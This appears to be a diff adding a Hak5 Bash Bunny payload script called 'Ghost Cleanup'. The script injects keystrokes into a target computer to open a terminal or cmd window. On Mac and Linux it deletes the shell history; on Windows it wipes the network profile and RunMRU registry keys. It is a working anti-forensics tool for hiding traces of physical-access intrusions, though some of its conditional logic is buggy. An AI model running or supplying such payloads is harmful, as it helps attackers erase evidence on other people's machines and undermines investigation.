@@ -1,0 +1,99 @@
+#!/bin/bash
+#
+# Title:         Ghost Cleanup
+# Author:        bg-wa
+# Version:       0.1
+# Target:        Windows, Mac, Linux
+# Props:         Hak5 E2124 - https://www.youtube.com/watch?v=qGPGOoJn54E
+#
+# Cleans the input history on Windows, Mac and Linux
+#
+LED G
+
+#+++ CONFIG +++
+
+# EXACT NUMBER OF LINES TO REMOVE FROM HISTORY (MAC / LINUX) - DEFAULT : 0 = ALL
+LINES=0
+
+#+++ END CONFIG +++
+
+#if [ $DEBUG==true ]; then
+#    DEBUG_FILE="/root/udisk/loot/ghost_cleanup/debug.txt"
+#    if [ ! -d "/root/udisk/loot/ghost_cleanup" ]; then
+#      mkdir /root/udisk/loot
+#      mkdir /root/udisk/loot/ghost_cleanup
+#    fi
+#    touch "${DEBUG_FILE}"
+#fi
+
+# PLATFORM CHECK
+# LOOTFILE CHECK - DEFAULT PLATFORM: MAC / LINUX.
+# FOR WINDOWS, CREATE FILE '/root/udisk/loot/ghost_cleanup/win_switch' IN YOUR FIRST PAYLOAD.
+
+if [ -f "/root/udisk/loot/ghost_cleanup/win_switch" ]; then
+    LED B
+    PLATFORM_COMMAND="cmd"
+else
+    LED O
+    PLATFORM_COMMAND="terminal"
+fi
+
+# START
+ATTACKMODE HID
+
+QUACK DELAY 500
+QUACK ALT F2
+QUACK DELAY 50
+QUACK GUI SPACE
+QUACK DELAY 50
+QUACK GUI r
+QUACK BACKSPACE
+QUACK DELAY 100
+QUACK STRING "${PLATFORM_COMMAND}"
+QUACK DELAY 200
+QUACK ENTER
+QUACK DELAY 1000
+
+# PLATFORM COMMANDS
+if [ "$PLATFORM_COMMAND"=="terminal" ]; then
+# MAC / LINUX
+    #++ INSERT CUSTOM MAC / LINUX CLEANUP GOODNESS ++
+
+    if [ "$LINES" -gt "0" ]; then
+        QUACK STRING head -n -$LINES "~/.bash_history"
+        QUACK ENTER
+        QUACK STRING history -c
+        QUACK ENTER
+    else
+        QUACK STRING rm "~/.bash_history"
+        QUACK ENTER
+        QUACK STRING history -c
+        QUACK ENTER
+    fi
+else
+# WINDOWS
+    #++ INSERT CUSTOM WINDOWS CLEANUP GOODNESS ++
+
+    # REMOVE EXTRA ETHERNET CONNECTIONS
+    # QUACK STRING netsh show profiles
+    # QUACK ENTER
+    # QUACK DELAY 100
+    # todo ADAPTER=Get last ethernet adapter
+    # QUACK ENTER
+    # QUACK STRING netsh delete profile interface= $ADAPTER
+    # QUACK ENTER
+    # QUACK DELAY 100
+
+    # REMOVE ALL ETHERNET ADAPTERS
+    QUACK STRING reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles /va /f
+    QUACK ENTER
+    QUACK DELAY 100
+    QUACK STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+    QUACK ENTER
+fi
+
+QUACK DELAY 100
+QUACK STRING exit
+QUACK ENTER
+
+LED G
